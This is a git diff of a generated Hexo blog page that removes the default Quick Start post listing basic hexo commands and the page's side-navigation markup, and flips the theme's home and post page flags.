-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/28/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
 
 
@@ -955,8 +386,8 @@ echo serialize($mango);
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
